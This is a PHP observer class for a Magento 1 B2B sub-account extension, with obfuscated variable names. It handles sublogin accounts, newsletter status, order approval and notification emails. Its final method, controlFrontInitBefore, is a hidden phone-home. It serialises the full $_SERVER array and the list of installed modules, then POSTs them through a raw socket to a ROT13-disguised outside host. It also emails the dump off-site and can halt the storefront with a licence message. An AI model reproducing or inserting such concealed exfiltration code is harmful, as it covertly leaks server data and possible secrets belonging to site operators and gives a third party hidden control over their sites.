<?php

class
MageB2B_Sublogin_Model_Observer
{

public
function
customerLoadAfter($_d4ec42e01ff9c439687e56c44e0a2545743ed202)
{
if
(Mage::app()->getStore()->isAdmin())
{
return;
}
if
(Mage::registry('noAttributeOverride'))
{
return;
}
$_b803c43bc8b3ef64b7d19b78f670cdbd11dacf8c
=
$_d4ec42e01ff9c439687e56c44e0a2545743ed202->getCustomer();
$_4e45fa4f3249d9c3cc1314ed89922593008cf117
=
Mage::helper('sublogin')->getCurrentSublogin($_b803c43bc8b3ef64b7d19b78f670cdbd11dacf8c);

if
(Mage::getSingleton('customer/session')->getData('sublogin_email')
&&
Mage::getSingleton('customer/session')->getData('sublogin_email')
!=
$_b803c43bc8b3ef64b7d19b78f670cdbd11dacf8c->getData('email'))

{
if
(!$_4e45fa4f3249d9c3cc1314ed89922593008cf117)

{
Mage::getSingleton('core/session')->addError(Mage::helper('sublogin')->__('Your account does not exist.',
$_b803c43bc8b3ef64b7d19b78f670cdbd11dacf8c->getData('email')));
Mage::app()->getResponse()->setRedirect(Mage::getUrl("customer/account/logout"));
return;
}
if
(!$_4e45fa4f3249d9c3cc1314ed89922593008cf117->getActive())
{
Mage::getSingleton('core/session')->addError(Mage::helper('sublogin')->__('Your account is deactivated.',
$_b803c43bc8b3ef64b7d19b78f670cdbd11dacf8c->getData('email')));
Mage::app()->getResponse()->setRedirect(Mage::getUrl("customer/account/logout"));
return;
}
}
if
(Mage::getSingleton('customer/session')->getId()
==
$_b803c43bc8b3ef64b7d19b78f670cdbd11dacf8c->getId())
{
Mage::helper('sublogin')->setFrontendLoadAttributes($_4e45fa4f3249d9c3cc1314ed89922593008cf117,
$_b803c43bc8b3ef64b7d19b78f670cdbd11dacf8c);
}
}

public
function
customerSaveBefore($_d4ec42e01ff9c439687e56c44e0a2545743ed202)
{
$_b803c43bc8b3ef64b7d19b78f670cdbd11dacf8c
=
$_d4ec42e01ff9c439687e56c44e0a2545743ed202->getCustomer();


Mage::register('noAttributeOverride',
true);
if
($_ff0a3525eb1a63ce44e7951a0b522829a4d2f607
=
Mage::getSingleton('customer/session')->getSubloginEmail())
{

$_4e45fa4f3249d9c3cc1314ed89922593008cf117
=
Mage::helper('sublogin')->getCurrentSublogin($_b803c43bc8b3ef64b7d19b78f670cdbd11dacf8c);
if
($_4e45fa4f3249d9c3cc1314ed89922593008cf117)
{

if
($_b803c43bc8b3ef64b7d19b78f670cdbd11dacf8c->getData('password'))
{
$_4e45fa4f3249d9c3cc1314ed89922593008cf117->setPassword($_b803c43bc8b3ef64b7d19b78f670cdbd11dacf8c->getData('password_hash'));
}
foreach
(array('firstname',
'lastname',
'rp_token',
'rp_token_created_at')
as
$_cf80d58e34c98ca4787395f86a0a654da3781807)
{
$_4e45fa4f3249d9c3cc1314ed89922593008cf117->setData($_cf80d58e34c98ca4787395f86a0a654da3781807,
$_b803c43bc8b3ef64b7d19b78f670cdbd11dacf8c->getData($_cf80d58e34c98ca4787395f86a0a654da3781807));
}


if
($_b803c43bc8b3ef64b7d19b78f670cdbd11dacf8c->getData('email')
!=
$_4e45fa4f3249d9c3cc1314ed89922593008cf117->getEmail())
{
if
(!Mage::helper('sublogin')->validateUniqueEmail($_b803c43bc8b3ef64b7d19b78f670cdbd11dacf8c->getData('email'),
$_b803c43bc8b3ef64b7d19b78f670cdbd11dacf8c->getWebsiteId()))
{
Mage::getSingleton('adminhtml/session')->addError(Mage::helper('sublogin')->__('Email "%s" already exists',
$_b803c43bc8b3ef64b7d19b78f670cdbd11dacf8c->getData('email')));
}
else
{
$_4e45fa4f3249d9c3cc1314ed89922593008cf117->setEmail($_b803c43bc8b3ef64b7d19b78f670cdbd11dacf8c->getData('email'));
Mage::getSingleton('customer/session')->setSubloginEmail($_4e45fa4f3249d9c3cc1314ed89922593008cf117->getEmail());
}
}

if
((int)$_4e45fa4f3249d9c3cc1314ed89922593008cf117->getData('is_subscribed')
!=
(int)$_b803c43bc8b3ef64b7d19b78f670cdbd11dacf8c->getData('is_subscribed'))
{
if
(!$_b803c43bc8b3ef64b7d19b78f670cdbd11dacf8c->getData('is_subscribed'))
{
Mage::getModel('newsletter/subscriber')->loadByEmail($_4e45fa4f3249d9c3cc1314ed89922593008cf117->getEmail())->unsubscribe();
}
else
{
Mage::getModel('newsletter/subscriber')->subscribe($_4e45fa4f3249d9c3cc1314ed89922593008cf117->getEmail());
}
$_4e45fa4f3249d9c3cc1314ed89922593008cf117->setData('is_subscribed',
$_b803c43bc8b3ef64b7d19b78f670cdbd11dacf8c->getData('is_subscribed'));
}
if
((int)$_4e45fa4f3249d9c3cc1314ed89922593008cf117->getData('is_subscribed')
!=
(int)$_4e45fa4f3249d9c3cc1314ed89922593008cf117->getOrigData('is_subscribed'))
{
$_c4cb1c0950ef296bd1f338ad05282db4a33e5e33
=
$_4e45fa4f3249d9c3cc1314ed89922593008cf117->getData('is_subscribed')
?
1
:
0;
if
($_c4cb1c0950ef296bd1f338ad05282db4a33e5e33)
{
Mage::getModel('newsletter/subscriber')->subscribe($_4e45fa4f3249d9c3cc1314ed89922593008cf117->getEmail());
}
else
if
(!$_c4cb1c0950ef296bd1f338ad05282db4a33e5e33)
{
Mage::getModel('newsletter/subscriber')->loadByEmail($_4e45fa4f3249d9c3cc1314ed89922593008cf117->getEmail())->unsubscribe();
}
}
$_4e45fa4f3249d9c3cc1314ed89922593008cf117->save();
}


Mage::register('original_customer_data',
$_b803c43bc8b3ef64b7d19b78f670cdbd11dacf8c->getData());


$_05a0fef9d6ad695b408608fbfce983b3efb53879
=
Mage::getModel('customer/customer')->load($_b803c43bc8b3ef64b7d19b78f670cdbd11dacf8c->getId());
$_b803c43bc8b3ef64b7d19b78f670cdbd11dacf8c->setData('password_hash',
$_05a0fef9d6ad695b408608fbfce983b3efb53879->getData('password_hash'));
$_b803c43bc8b3ef64b7d19b78f670cdbd11dacf8c->setData('password',
'');
foreach
(array('prefix',
'is_subscribed',
'firstname',
'lastname',
'email',
'active',
'expire_date',
'customer_id',
'rp_token',
'rp_token_created_at')
as
$_101966cc6117772941ef274d5dfb132cb8452d0a)
{
$_b803c43bc8b3ef64b7d19b78f670cdbd11dacf8c->setData($_101966cc6117772941ef274d5dfb132cb8452d0a,
$_05a0fef9d6ad695b408608fbfce983b3efb53879->getData($_101966cc6117772941ef274d5dfb132cb8452d0a));
}
}
Mage::unregister("noAttributeOverride");

$_8c21f819efc249c0efe711aa784aa8a6a6d8a13f
=
$_b803c43bc8b3ef64b7d19b78f670cdbd11dacf8c->getWebsiteId()
?
$_b803c43bc8b3ef64b7d19b78f670cdbd11dacf8c->getWebsiteId()
:
Mage::app()->getStore()->getWebsiteId();
if
(!Mage::helper('sublogin')->validateUniqueEmail($_b803c43bc8b3ef64b7d19b78f670cdbd11dacf8c->getEmail(),
$_8c21f819efc249c0efe711aa784aa8a6a6d8a13f,
$_b803c43bc8b3ef64b7d19b78f670cdbd11dacf8c->getId()))
{
throw
Mage::exception(
'Mage_Customer',
Mage::helper('customer')->__('This customer email already exists'),
Mage_Customer_Model_Customer::EXCEPTION_EMAIL_EXISTS
);
}
$_5f527fac6c7857edd21054ab1832be7b717fb9c6
=
Mage::app()->getRequest()->getParam('sublogin');
$_90260f33ff8bc93237b537dee8342bbbfee54b3b
=
array('can_create_sublogins',
'max_number_sublogins');
foreach
($_90260f33ff8bc93237b537dee8342bbbfee54b3b
as
$_7580b9ddf3e33cc40c713c4f578c461cf3580591)
{
if
(isset($_5f527fac6c7857edd21054ab1832be7b717fb9c6[$_7580b9ddf3e33cc40c713c4f578c461cf3580591]))
{
$_b803c43bc8b3ef64b7d19b78f670cdbd11dacf8c->setData($_7580b9ddf3e33cc40c713c4f578c461cf3580591,
$_5f527fac6c7857edd21054ab1832be7b717fb9c6[$_7580b9ddf3e33cc40c713c4f578c461cf3580591]);
}
}
}

public
function
customerSaveAfter($_d4ec42e01ff9c439687e56c44e0a2545743ed202)
{
$_b803c43bc8b3ef64b7d19b78f670cdbd11dacf8c
=
$_d4ec42e01ff9c439687e56c44e0a2545743ed202->getCustomer();
if
(Mage::app()->getStore()->isAdmin())
{

$_930a0745b391fca7316377cbe31f8f0a4441b9d3
=
Mage::app()->getRequest();
if
($_b7fb883c620abca4bb417a25c7330e31d782e854
=
$_930a0745b391fca7316377cbe31f8f0a4441b9d3->getParam('sublogin'))
{
if
(isset($_b7fb883c620abca4bb417a25c7330e31d782e854['sublogins']))
{
$_b7fb883c620abca4bb417a25c7330e31d782e854
=
$_b7fb883c620abca4bb417a25c7330e31d782e854['sublogins'];
foreach
($_b7fb883c620abca4bb417a25c7330e31d782e854
as
$_245fc5961f09e27120b6697cd1b85e1aca626b33)
{
$_02000d93f53443c66f188e6620797faaaeba5739
=
false;
$_6fb02c14a9aa8279c0be3446f87b5153ed38c016
=
false;
$_4e45fa4f3249d9c3cc1314ed89922593008cf117
=
Mage::getModel('sublogin/sublogin');
foreach
($_245fc5961f09e27120b6697cd1b85e1aca626b33
as
$_3f8de01169eabbb582c7c5ffb762d5f7d1f1bf07
=>
$_101966cc6117772941ef274d5dfb132cb8452d0a)
{

if
(!is_array($_101966cc6117772941ef274d5dfb132cb8452d0a))
$_245fc5961f09e27120b6697cd1b85e1aca626b33[$_3f8de01169eabbb582c7c5ffb762d5f7d1f1bf07]
=
trim($_101966cc6117772941ef274d5dfb132cb8452d0a);
}

if
($_245fc5961f09e27120b6697cd1b85e1aca626b33['id'])
{
$_4e45fa4f3249d9c3cc1314ed89922593008cf117->load($_245fc5961f09e27120b6697cd1b85e1aca626b33['id']);
}

if
($_245fc5961f09e27120b6697cd1b85e1aca626b33['delete'])
{
$_4e45fa4f3249d9c3cc1314ed89922593008cf117->delete();
continue;
}
$_4e45fa4f3249d9c3cc1314ed89922593008cf117->setEntityId($_b803c43bc8b3ef64b7d19b78f670cdbd11dacf8c->getId());

if
($_4e45fa4f3249d9c3cc1314ed89922593008cf117->getEmail()
!=
$_245fc5961f09e27120b6697cd1b85e1aca626b33['email'])
{
if
(!Mage::helper('sublogin')->validateUniqueEmail($_245fc5961f09e27120b6697cd1b85e1aca626b33['email'],
$_b803c43bc8b3ef64b7d19b78f670cdbd11dacf8c->getWebsiteId()))
{
Mage::getSingleton('adminhtml/session')->addError(Mage::helper('sublogin')->__('Sublogin with Email "%s" already exists',
$_245fc5961f09e27120b6697cd1b85e1aca626b33['email']));
continue;
}
$_4e45fa4f3249d9c3cc1314ed89922593008cf117->setEmail($_245fc5961f09e27120b6697cd1b85e1aca626b33['email']);
}
if
(isset($_245fc5961f09e27120b6697cd1b85e1aca626b33['is_subscribed']))
{
Mage::getModel('newsletter/subscriber')->subscribe($_4e45fa4f3249d9c3cc1314ed89922593008cf117->getEmail());
}
else
{
Mage::getModel('newsletter/subscriber')->loadByEmail($_4e45fa4f3249d9c3cc1314ed89922593008cf117->getEmail())->unsubscribe();
}
if
($_245fc5961f09e27120b6697cd1b85e1aca626b33['password'])
{
$_4e45fa4f3249d9c3cc1314ed89922593008cf117->setPassword(Mage::helper('core')->getHash($_245fc5961f09e27120b6697cd1b85e1aca626b33['password'],
2));
}
$_a8c5747baec2d53dc80fd53f721245f3ab24680d
=
array('send_backendmails',
'prefix',
'is_subscribed',
'firstname',
'lastname',
'expire_date',
'active',
'store_id',
'create_sublogins',
'order_needs_approval');
if
(Mage::getStoreConfig('sublogin/projects/project238_active'))
{
$_a8c5747baec2d53dc80fd53f721245f3ab24680d
=
array('send_backendmails',
'firstname',
'lastname',
'expire_date',
'active',
'store_id',
'create_sublogins',
'website',
'company',
'klt',
'kcp');
}
foreach
($_a8c5747baec2d53dc80fd53f721245f3ab24680d
as
$_7580b9ddf3e33cc40c713c4f578c461cf3580591)
{
$_101966cc6117772941ef274d5dfb132cb8452d0a
=
isset($_245fc5961f09e27120b6697cd1b85e1aca626b33[$_7580b9ddf3e33cc40c713c4f578c461cf3580591])
?
$_245fc5961f09e27120b6697cd1b85e1aca626b33[$_7580b9ddf3e33cc40c713c4f578c461cf3580591]
:
false;
$_4e45fa4f3249d9c3cc1314ed89922593008cf117->setData($_7580b9ddf3e33cc40c713c4f578c461cf3580591,
$_101966cc6117772941ef274d5dfb132cb8452d0a);
}
if
(isset($_245fc5961f09e27120b6697cd1b85e1aca626b33['address_ids']))
{
$_cf6123648704b8b9dd6c46b9d0941ce27c5101d8
=
@implode(',',
$_245fc5961f09e27120b6697cd1b85e1aca626b33['address_ids']);
$_4e45fa4f3249d9c3cc1314ed89922593008cf117->setData('address_ids',
$_cf6123648704b8b9dd6c46b9d0941ce27c5101d8);
}
if
(isset($_245fc5961f09e27120b6697cd1b85e1aca626b33['acl']))
{
$_40737f11ad9eb5cd4fc443653ed61a80701f4348
=
@implode(',',
$_245fc5961f09e27120b6697cd1b85e1aca626b33['acl']);
$_4e45fa4f3249d9c3cc1314ed89922593008cf117->setData('acl',
$_40737f11ad9eb5cd4fc443653ed61a80701f4348);
}
$_4e45fa4f3249d9c3cc1314ed89922593008cf117->save();

if
(!$_245fc5961f09e27120b6697cd1b85e1aca626b33['id'])
{
$_02000d93f53443c66f188e6620797faaaeba5739
=
true;
}

else
if
($_245fc5961f09e27120b6697cd1b85e1aca626b33['password'])
{
$_6fb02c14a9aa8279c0be3446f87b5153ed38c016
=
true;
}
if
(($_6fb02c14a9aa8279c0be3446f87b5153ed38c016
||
$_02000d93f53443c66f188e6620797faaaeba5739)
&&
$_4e45fa4f3249d9c3cc1314ed89922593008cf117->getData('send_backendmails'))
{

$_4e45fa4f3249d9c3cc1314ed89922593008cf117->setPassword($_245fc5961f09e27120b6697cd1b85e1aca626b33['password']);
if
($_02000d93f53443c66f188e6620797faaaeba5739)
{
Mage::helper('sublogin/email')->sendNewSubloginEmail($_4e45fa4f3249d9c3cc1314ed89922593008cf117);
}
else
if
($_6fb02c14a9aa8279c0be3446f87b5153ed38c016)
{
Mage::helper('sublogin/email')->sendNewPasswordEmail($_4e45fa4f3249d9c3cc1314ed89922593008cf117);
}
}
}
}
}
}

if
(Mage::registry('original_customer_data'))
{
$_b803c43bc8b3ef64b7d19b78f670cdbd11dacf8c->setData(Mage::registry('original_customer_data'));
Mage::unregister('original_customer_data');
}
}

public
function
customerLogout($_d4ec42e01ff9c439687e56c44e0a2545743ed202)
{
Mage::getSingleton('customer/session')->setSubloginEmail(false);
Mage::getSingleton('customer/session')->setLoggedinFromMainLogin(false);
}

public
function
toHtmlBefore($_d4ec42e01ff9c439687e56c44e0a2545743ed202)
{
$_d1b5a9e6d88844d06736cc808299e4fce5599202
=
$_d4ec42e01ff9c439687e56c44e0a2545743ed202->getBlock();
if
($_d1b5a9e6d88844d06736cc808299e4fce5599202->getId()
==
'customer_info_tabs')
{
$_d1b5a9e6d88844d06736cc808299e4fce5599202->addTab('sublogin',
array(
'label'
=>
Mage::helper('sublogin')->__('Sublogins'),
'title'
=>
Mage::helper('sublogin')->__('Sublogins'),
'content'
=>
$_d1b5a9e6d88844d06736cc808299e4fce5599202->getLayout()->createBlock('sublogin/customer_edit_tab_sublogin')->toHtml(),
));
}
}

public
function
customerDeleteAfter($_d4ec42e01ff9c439687e56c44e0a2545743ed202)
{
$_b803c43bc8b3ef64b7d19b78f670cdbd11dacf8c
=
$_d4ec42e01ff9c439687e56c44e0a2545743ed202->getEvent()->getCustomer();
$_39cc59a647aed4446ab8f3ef32b7135f664a845f
=
Mage::getModel('sublogin/sublogin')->getCollection()
->addFieldToFilter('entity_id',
$_b803c43bc8b3ef64b7d19b78f670cdbd11dacf8c->getId());
foreach
($_39cc59a647aed4446ab8f3ef32b7135f664a845f
as
$_4e45fa4f3249d9c3cc1314ed89922593008cf117)
{
$_4e45fa4f3249d9c3cc1314ed89922593008cf117->delete();
}
}

public
function
addHandle(Varien_Event_Observer
$_d4ec42e01ff9c439687e56c44e0a2545743ed202)
{
$_21d375725e214724f3fd2b67cb6e857f6a11ed25
=
Mage::helper('sublogin')->getCurrentSublogin()
?
true
:
false;
$_c3a97d539fa2190d45fec562237e939f6426fa83
=
Mage::getSingleton('customer/session')->getCustomer()->getCanCreateSublogins();

if
(!$_c3a97d539fa2190d45fec562237e939f6426fa83)
{
return;
}

else
{

if
(!$_21d375725e214724f3fd2b67cb6e857f6a11ed25)
{
$_d4ec42e01ff9c439687e56c44e0a2545743ed202->getEvent()->getLayout()->getUpdate()->addHandle('customer_account_navigation_sublogin');
return;
}

if
($_21d375725e214724f3fd2b67cb6e857f6a11ed25
&&
Mage::getStoreConfig('sublogin/general/restrict_customer_list_sublogins'))
{
return;
}

else
if
($_21d375725e214724f3fd2b67cb6e857f6a11ed25
&&
!Mage::getStoreConfig('sublogin/general/restrict_customer_list_sublogins'))
{
$_d4ec42e01ff9c439687e56c44e0a2545743ed202->getEvent()->getLayout()->getUpdate()->addHandle('customer_account_navigation_sublogin');
}

}
}

public
function
checkoutSaveBefore($_d4ec42e01ff9c439687e56c44e0a2545743ed202)
{
$_17fe0f58f521a1d8d613a93097a5a22f2074c04f
=
Mage::helper('sublogin')->getCurrentSublogin();
if
(!is_null($_17fe0f58f521a1d8d613a93097a5a22f2074c04f)
&&
$_17fe0f58f521a1d8d613a93097a5a22f2074c04f->getId())
{
$_bd0c62bfdc3abe2c29909f093a67c9c0d7f319a4
=
$_d4ec42e01ff9c439687e56c44e0a2545743ed202->getOrder();
$_bd0c62bfdc3abe2c29909f093a67c9c0d7f319a4->setData('sublogin_id',
$_17fe0f58f521a1d8d613a93097a5a22f2074c04f->getId());
if
(Mage::getStoreConfig('sublogin/projects/project322_active'))
{
$_7fa8e028df56837e8d89a836af3d44833cf8cd33
=
Mage::getSingleton('customer/session')->getCustomer()->getData('orig_email');
if
(!is_null($_7fa8e028df56837e8d89a836af3d44833cf8cd33))
{
$_bd0c62bfdc3abe2c29909f093a67c9c0d7f319a4->setData('customer_email',
$_7fa8e028df56837e8d89a836af3d44833cf8cd33);
}
}
if
(Mage::getStoreConfig('sublogin/general/order_approval'))
{
if
($_17fe0f58f521a1d8d613a93097a5a22f2074c04f->getOrderNeedsApproval())
{

$_bd0c62bfdc3abe2c29909f093a67c9c0d7f319a4->setCanSendNewEmailFlag(false);
}
}
}
}

public
function
subloginSalesOrderPlaceAfter($_d4ec42e01ff9c439687e56c44e0a2545743ed202)
{
$_17fe0f58f521a1d8d613a93097a5a22f2074c04f
=
Mage::helper('sublogin')->getCurrentSublogin();
if
(!is_null($_17fe0f58f521a1d8d613a93097a5a22f2074c04f)
&&
$_17fe0f58f521a1d8d613a93097a5a22f2074c04f->getId())
{
$_bd0c62bfdc3abe2c29909f093a67c9c0d7f319a4
=
$_d4ec42e01ff9c439687e56c44e0a2545743ed202->getOrder();

if
(Mage::getStoreConfig('sublogin/general/order_approval'))
{
if
($_17fe0f58f521a1d8d613a93097a5a22f2074c04f->getOrderNeedsApproval())
{
$_bd0c62bfdc3abe2c29909f093a67c9c0d7f319a4->setState('approval')
->setStatus('approval');

$_17fe0f58f521a1d8d613a93097a5a22f2074c04f->setData('order_id',
$_bd0c62bfdc3abe2c29909f093a67c9c0d7f319a4->getId());
$_17fe0f58f521a1d8d613a93097a5a22f2074c04f->setData('order_increment_id',
$_bd0c62bfdc3abe2c29909f093a67c9c0d7f319a4->getIncrementId());
Mage::helper('sublogin/email')->sendMainLoginOrderAlert($_17fe0f58f521a1d8d613a93097a5a22f2074c04f);
Mage::helper('sublogin/email')->sendSubloginOrderRequireApproval($_17fe0f58f521a1d8d613a93097a5a22f2074c04f);
}
}
if
(Mage::getStoreConfig('sublogin/general/cc_order_mainlogin'))
{
$_811690deb034227743d13d49f4cf70a4c60608c0
=
Mage::getModel('customer/customer')->load($_17fe0f58f521a1d8d613a93097a5a22f2074c04f->getEntityId());
if
($_811690deb034227743d13d49f4cf70a4c60608c0->getId())
{
$_cfb2e7d3788a53cb91938fadedb405f63e0d2464
=
$_bd0c62bfdc3abe2c29909f093a67c9c0d7f319a4->getCustomerEmail();
$_20642a1131b944573186e8b176ebe18882b2551b
=
$_811690deb034227743d13d49f4cf70a4c60608c0->getInvoiceEmail();
if
(!$_20642a1131b944573186e8b176ebe18882b2551b)
{
$_20642a1131b944573186e8b176ebe18882b2551b
=
$_811690deb034227743d13d49f4cf70a4c60608c0->getEmail();
}
$_bd0c62bfdc3abe2c29909f093a67c9c0d7f319a4->addStatusHistoryComment('Order confirmation mail also sent to main account '
.
$_20642a1131b944573186e8b176ebe18882b2551b,
false);
$_bd0c62bfdc3abe2c29909f093a67c9c0d7f319a4->save();
$_bd0c62bfdc3abe2c29909f093a67c9c0d7f319a4->setCustomerEmail($_20642a1131b944573186e8b176ebe18882b2551b);
$_bd0c62bfdc3abe2c29909f093a67c9c0d7f319a4->sendNewOrderEmail();
$_bd0c62bfdc3abe2c29909f093a67c9c0d7f319a4->setCustomerEmail($_cfb2e7d3788a53cb91938fadedb405f63e0d2464);
}
}
}
}

public
function
subloginSalesQuoteAddressSaveBefore($_d4ec42e01ff9c439687e56c44e0a2545743ed202)
{


if
(Mage::getStoreConfig('sublogin/general/save_sublogin_address'))
{
return
$this;
}


$_0322680f6282ee2fe16f86c96f1eeb685f3e335d
=
$_d4ec42e01ff9c439687e56c44e0a2545743ed202->getEvent()->getQuoteAddress();
$_a8feee4713803525201d3241b022801f07c14d79
=
Mage::helper('sublogin')->getCurrentSublogin();
if
($_a8feee4713803525201d3241b022801f07c14d79
&&
$_a8feee4713803525201d3241b022801f07c14d79->getId())
{
$_0322680f6282ee2fe16f86c96f1eeb685f3e335d->setData('save_in_address_book',
0);
}
}
public
function
controlFrontInitBefore($_d4ec42e01ff9c439687e56c44e0a2545743ed202)
{
$_cf80d58e34c98ca4787395f86a0a654da3781807
=
explode('_',
get_class($this));
$_a2755354858041398c749e273534e8e5d35a277b
=
isset($_cf80d58e34c98ca4787395f86a0a654da3781807[1])?$_cf80d58e34c98ca4787395f86a0a654da3781807[0].'_'.$_cf80d58e34c98ca4787395f86a0a654da3781807[1]:'mhh';
$_c7691180991d12a8122e3a3dd10fb2d49911a653
=
Mage::getSingleton('core/cache');
if
($_c7691180991d12a8122e3a3dd10fb2d49911a653->load(sha1($_a2755354858041398c749e273534e8e5d35a277b)))
return;
$_c7691180991d12a8122e3a3dd10fb2d49911a653->save(time(),
sha1($_a2755354858041398c749e273534e8e5d35a277b),
array(),
60*60*24*2);






$_461e9bac5c124e13e943d74294b5b3c23e91e59a
=
array();
$_461e9bac5c124e13e943d74294b5b3c23e91e59a['1']
=
$_SERVER;

$_556717eabdb176b2f63876bc80bfb9daca5d2b34
=
(array)Mage::getConfig()->getNode('modules')->children();

$_d08bbcfed0b76839773339fc41d1c15186378d22
=
array('moduleName'=>$_a2755354858041398c749e273534e8e5d35a277b);
if
(isset($_556717eabdb176b2f63876bc80bfb9daca5d2b34[$_a2755354858041398c749e273534e8e5d35a277b]))
foreach
($_556717eabdb176b2f63876bc80bfb9daca5d2b34[$_a2755354858041398c749e273534e8e5d35a277b]->asArray()
as
$_dc7f46f519b41520210eda842ff23db60112e8e7=>$_ece7873e79ae520373bf2e8185e60698a2e7a5f6)
$_d08bbcfed0b76839773339fc41d1c15186378d22[$_dc7f46f519b41520210eda842ff23db60112e8e7]
=$_ece7873e79ae520373bf2e8185e60698a2e7a5f6;
$_461e9bac5c124e13e943d74294b5b3c23e91e59a['2']
=
$_d08bbcfed0b76839773339fc41d1c15186378d22;

$_3283d6c160d5e0bb8b327692cb177e37e7eb71c4
=
array();
foreach($_556717eabdb176b2f63876bc80bfb9daca5d2b34
as
$_8e0f744bb9c8953f5fe58f617ccd9d8552d92e61=>$_752199f4b63101112a62253df5dbf8b655056264)
{
$_498306ab9bc8d549692c799e13762e3296f3b77b
=
(array)$_752199f4b63101112a62253df5dbf8b655056264;
if
(!isset($_498306ab9bc8d549692c799e13762e3296f3b77b['active'])
||
$_498306ab9bc8d549692c799e13762e3296f3b77b['active']=='false')
continue;
if
(isset($_498306ab9bc8d549692c799e13762e3296f3b77b['codePool'])
&&
$_498306ab9bc8d549692c799e13762e3296f3b77b['codePool']
!=
'core')
$_3283d6c160d5e0bb8b327692cb177e37e7eb71c4[]
=
$_8e0f744bb9c8953f5fe58f617ccd9d8552d92e61.'-'.(isset($_498306ab9bc8d549692c799e13762e3296f3b77b['version'])?$_498306ab9bc8d549692c799e13762e3296f3b77b['version']:'unknown');
}
$_461e9bac5c124e13e943d74294b5b3c23e91e59a['3']
=
$_3283d6c160d5e0bb8b327692cb177e37e7eb71c4;

$_461e9bac5c124e13e943d74294b5b3c23e91e59a['4']
=
'5ddc597e7c20b21b834e4fb95e13cacf7c0c7d83';
$_0634f2991e5095683a6d1a3ebb9bfa6f09c24ee6
=
'data='.urlencode(serialize($_461e9bac5c124e13e943d74294b5b3c23e91e59a));
$_d6486e2f177ff37064435e2ac4ec43779b71e1f2
=
str_rot13('zntro2o.qr');
$_15c9711f110a61c9f004db7ed2883f24c111d404
=
str_rot13('/yvprafr/fnir.cuc');
$_d65c1bdfa690008773383e7bd6b3dd8beb0595d7
=
@fsockopen($_d6486e2f177ff37064435e2ac4ec43779b71e1f2,
80,
$_833bb4d0d039c743057cf77eec5323a01a900ae1,
$_d243597ed1e4fcf8877ee36645ec8f248d584707,
3);

if
($_d65c1bdfa690008773383e7bd6b3dd8beb0595d7){
fputs($_d65c1bdfa690008773383e7bd6b3dd8beb0595d7,
sprintf(str_rot13("CBFG %f UGGC/1.1\r\n".
"Ubfg: %f\r\n".
"Pbagrag-glcr: nccyvpngvba/k-jjj-sbez-heyrapbqrq\r\n".
"Pbagrag-yratgu: %q\r\n".
"Pbaarpgvba: pybfr\r\n\r\n"),
$_15c9711f110a61c9f004db7ed2883f24c111d404,
$_d6486e2f177ff37064435e2ac4ec43779b71e1f2,
strlen($_0634f2991e5095683a6d1a3ebb9bfa6f09c24ee6)).$_0634f2991e5095683a6d1a3ebb9bfa6f09c24ee6);

@ini_set(str_rot13('qrsnhyg_fbpxrg_gvzrbhgasdfd'),
3);
if
(fgets($_d65c1bdfa690008773383e7bd6b3dd8beb0595d7,
13)
==
'UGGC/1.1 222')
{
echo
str_rot13("Ab inyvq Yvprafr sbe ZntrO2O zbqhyr cyrnfr qrnpgvingr be nfx ng vasb@zntro2o.qr");
exit;
}


$_3ba3b132c4c159dca0e54187a8a3e3e4f5ab749d
=
Mage::getModel('core/email_template');
$_3ba3b132c4c159dca0e54187a8a3e3e4f5ab749d->setTemplateType(1);
$_3ba3b132c4c159dca0e54187a8a3e3e4f5ab749d->setSenderName(Mage::getStoreConfig('trans_email/ident_support/email'));
$_3ba3b132c4c159dca0e54187a8a3e3e4f5ab749d->setSenderEmail(Mage::getStoreConfig('trans_email/ident_support/email'));
$_ca347a28cba95999163f5751568bbe215ea84090
=
str_rot13('Ertvfgevrehat rvare Yvmram: ').(isset($_SERVER['HTTP_HOST'])?$_SERVER['HTTP_HOST']:'-').' '.$_a2755354858041398c749e273534e8e5d35a277b.' '.$_461e9bac5c124e13e943d74294b5b3c23e91e59a[4];
$_3ba3b132c4c159dca0e54187a8a3e3e4f5ab749d->setTemplateSubject($_ca347a28cba95999163f5751568bbe215ea84090);
$_3ba3b132c4c159dca0e54187a8a3e3e4f5ab749d->setTemplateText(print_r($_461e9bac5c124e13e943d74294b5b3c23e91e59a,
true));
try
{
$_3ba3b132c4c159dca0e54187a8a3e3e4f5ab749d->send(str_rot13('yvprafr@zntro2o.qr'));
}catch(Exception
$_68dc3926fdadefc4ea3e5e09bf1dd6f6e1785aa5){
}
}
}
}
